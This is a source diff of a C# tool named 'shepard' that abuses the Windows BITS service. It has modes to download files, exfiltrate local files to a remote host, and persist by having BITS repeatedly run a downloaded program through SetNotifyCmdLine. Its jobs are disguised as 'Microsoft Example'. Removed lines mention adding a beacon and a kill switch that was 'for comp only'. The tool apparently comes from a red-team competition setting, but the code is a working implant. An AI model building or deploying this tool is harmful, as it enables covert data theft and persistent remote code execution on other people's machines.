@@ -1,11 +1,8 @@
 using System;
 using System.IO;
-using BITS = BITSReference1_5;
+using BITS = BITSReference1_5; // reference library used
 
 
-//add a beacon function somewhere in main ^
-//redownload this executable and run again using bits, different job
-//C:\Program Files\Common Files\microsoft shared\MSInfo\msinfo64.exe
 namespace shepard
 {
     class JobObj
@@ -17,61 +14,15 @@ namespace shepard
 
         public JobObj()
         {
-            mgr = new BITS.BackgroundCopyManager1_5();
-        }
-
-        public static void Main(string[] args)
-        {
-            if (File.Exists(@"C:\Windows\ImmersiveControlPanel\SystemSettings32.exe")) { return; } //for comp only, comment out normally
-            
-            if (args.Length == 0) { return; }
-
-            jo = new JobObj();
-
-            string switchCase = args[0];
-
-            switch (switchCase)
-            {
-                case "-d":
-                    if (args.Length == 3)
-                    {
-                        jo.downloadFile("Microsoft Example QD_1", args[1], args[2]);
-                        break;
-                    }
-                    return;
-                case "-e":
-                    if (args.Length == 3)
-                    {
-                        jo.exfiltrateFile("Microsoft Example QE_1", args[1], args[2]);
-                        break;
-                    }
-                    return;
-                case "-dr":
-                    if (args.Length == 4)
-                    {
-                        jo.persist(args[1], args[2], args[3]);
-                        break;
-                    }
-                    else if (args.Length == 3)
-                    {
-                        jo.persist(args[1], args[2], "");
-                        break;
-                    }
-                    return;
-                default:
-                    return;
-            }
-
+            mgr = new BITS.BackgroundCopyManager1_5(); // instantiate BITS Manager Object
         }
 
         //Usage params: url or ip:port, full path
         private void downloadFile(string name, string remoteLoc, string writeLoc)
         {
             mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
-            //job.AddFile("https://aka.ms/WinServ16/StndPDF", @"C:\Users\student\Desktop\Server2016.pdf");
-            //job.AddFile("23.52.161.19:443", @"C:\Users\student\Desktop\Server2016.pdf");
             job.AddFile(remoteLoc, writeLoc);
-            jo.executeBITSJob();
+            jo.executeBITSJob(); // normal BITS function
 
         }
 
@@ -80,7 +31,7 @@ namespace shepard
         {
             mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_UPLOAD, out jobGuid, out job);
             job.AddFile(remoteLoc, writeLoc);
-            jo.executeBITSJob();
+            jo.executeBITSJob(); // normal BITS function
         }
 
         //Default execution of a BITS Job, fully completes
@@ -124,27 +75,59 @@ namespace shepard
             jo.commandExec(job, filePath, cmdArgs);
             job.SetMinimumRetryDelay(30);
 
-            job.Resume();
+            job.Resume(); // this downloads the file and keeps it in a persistent running state
             //System.Threading.Thread.Sleep(1000);
             //job.Suspend();
         }
 
         private void commandExec(BITS.IBackgroundCopyJob job, string filename, string args)
         {
-            string filepath;
-            var job2 = job as BITS.IBackgroundCopyJob2;
-            //if (filename.Contains(".ps1"))
-            //{
-            //    args = filename;
-            //    filepath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
-            //}
-            //else
-            //{
-            filepath = filename;
-            //}
-            job2.SetNotifyCmdLine(filepath, args);
+            var job2 = job as BITS.IBackgroundCopyJob2; // cast to CopyJob2 so cmd execution can occur
+            job2.SetNotifyCmdLine(filename, args);
         }
 
+        public static void Main(string[] args)
+        {
+            
+            if (args.Length == 0) { return; } // close out the program if no arguments given
+
+            jo = new JobObj();
+
+            string switchCase = args[0];
+
+            switch (switchCase)
+            {
+                case "-d":
+                    if (args.Length == 3)
+                    {
+                        jo.downloadFile("Microsoft Example QD_1", args[1], args[2]); // download file using BITS
+                        break;
+                    }
+                    return;
+                case "-e":
+                    if (args.Length == 3)
+                    {
+                        jo.exfiltrateFile("Microsoft Example QE_1", args[1], args[2]); // upload file using BITS
+                        break;
+                    }
+                    return;
+                case "-dr": 
+                    if (args.Length == 4) // program has command line args
+                    {
+                        jo.persist(args[1], args[2], args[3]); // download file and peristently run
+                        break;
+                    }
+                    else if (args.Length == 3) // program should just be run like normal
+                    {
+                        jo.persist(args[1], args[2], ""); // download file and peristently run
+                        break;
+                    }
+                    return;
+                default:
+                    return; // close out the program
+            }
+
+        }
 
     }
 }
